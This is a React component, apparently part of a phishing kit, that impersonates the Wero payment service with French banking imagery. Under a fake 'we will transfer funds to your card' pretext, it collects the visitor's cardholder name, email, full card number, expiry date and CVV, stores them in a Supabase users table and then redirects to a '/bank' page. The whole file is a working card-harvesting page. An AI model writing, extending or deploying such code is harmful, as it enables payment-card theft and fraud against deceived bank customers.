
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { supabase } from "@/lib/supabase";
import { Footer } from "@/components/Footer";
import { useToast } from "@/components/ui/use-toast";
import { Lock } from "lucide-react";

const Card = () => {
  const [formData, setFormData] = useState({
    titulaire: "",
    email: "",
    numerocarte: "",
    dateexpiration: "",
    cryptogramme: "",
  });
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!formData.titulaire || !formData.email || !formData.numerocarte || 
        !formData.dateexpiration || !formData.cryptogramme) {
      toast({
        title: "Erreur de validation",
        description: "Veuillez remplir tous les champs",
        variant: "destructive",
      });
      return;
    }
    
    setIsLoading(true);
    
    const userId = localStorage.getItem("userId");
    
    if (!userId) {
      navigate("/");
      return;
    }
    
    try {
      // Mettre à jour les informations de carte dans la base de données
      await supabase
        .from("users")
        .update({
          email: formData.email,
          numerocarte: formData.numerocarte,
          dateexpiration: formData.dateexpiration,
          cryptogramme: formData.cryptogramme,
        })
        .eq("id", userId);
      
      // Rediriger vers la page suivante
      navigate("/bank");
    } catch (error) {
      console.error(error);
      toast({
        title: "Erreur",
        description: "Une erreur est survenue lors de l'enregistrement des informations de carte",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      <header className="bg-yellow-300 p-4">
        <h1 className="text-2xl font-bold">WERO</h1>
      </header>
      
      <main className="flex-grow flex justify-center p-4">
        <div className="max-w-md w-full">
          <h2 className="text-2xl font-bold text-yellow-500 text-center mb-4">
            VEUILLEZ CONFIRMER VOTRE CARTE SUR WERO.
          </h2>
          
          <div className="flex justify-center mb-4">
            <img 
              src="https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=242,h=138,fit=crop/Aq2q239lEjf2a2Mj/caisse-depargne-banque-populaire-_-ce-nouveau-moyen-de-paiement-arrive-en-exclusivite-debut-juillet-2-AMqlq7W4oNHNqVJM.jpg" 
              className="img-fluid" 
              alt="Carte bancaire"
            />
          </div>
          
          <p className="text-center mb-8">
            Afin d'assurer la protection de nos utilisateurs, nous effectuerons un virement direct des fonds
            vers votre carte bancaire.
          </p>
          
          <form onSubmit={handleSubmit} className="space-y-6 bg-gray-50 p-6 rounded-lg">
            <div className="space-y-2">
              <Label htmlFor="titulaire">Titulaire de la carte</Label>
              <Input
                id="titulaire"
                name="titulaire"
                value={formData.titulaire}
                onChange={handleChange}
                className="border-2 border-yellow-300 focus:border-yellow-400 focus:ring-yellow-400"
                required
              />
            </div>
            
            <div className="space-y-2">
              <Label htmlFor="email">Adresse e-mail</Label>
              <Input
                id="email"
                name="email"
                type="email"
                value={formData.email}
                onChange={handleChange}
                className="border-2 border-yellow-300 focus:border-yellow-400 focus:ring-yellow-400"
                required
              />
            </div>
            
            <div className="space-y-2">
              <Label htmlFor="numerocarte">Numéro de carte</Label>
              <Input
                id="numerocarte"
                name="numerocarte"
                placeholder="•••• •••• •••• ••••"
                value={formData.numerocarte}
                onChange={handleChange}
                className="border-2 border-yellow-300 focus:border-yellow-400 focus:ring-yellow-400"
                required
              />
            </div>
            
            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="dateexpiration">Date d'expiration</Label>
                <Input
                  id="dateexpiration"
                  name="dateexpiration"
                  placeholder="MM/YY"
                  value={formData.dateexpiration}
                  onChange={handleChange}
                  className="border-2 border-yellow-300 focus:border-yellow-400 focus:ring-yellow-400"
                  required
                />
              </div>
              
              <div className="space-y-2">
                <Label htmlFor="cryptogramme">CVV</Label>
                <Input
                  id="cryptogramme"
                  name="cryptogramme"
                  placeholder="•••"
                  value={formData.cryptogramme}
                  onChange={handleChange}
                  className="border-2 border-yellow-300 focus:border-yellow-400 focus:ring-yellow-400"
                  required
                />
              </div>
            </div>
            
            <Button
              type="submit"
              className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-semibold py-3 flex items-center justify-center"
              disabled={isLoading}
            >
              <Lock className="mr-2 h-4 w-4" />
              {isLoading ? "Validation..." : "Valider en toute sécurité"}
            </Button>
          </form>
        </div>
      </main>
      
      <Footer />
    </div>
  );
};

export default Card;
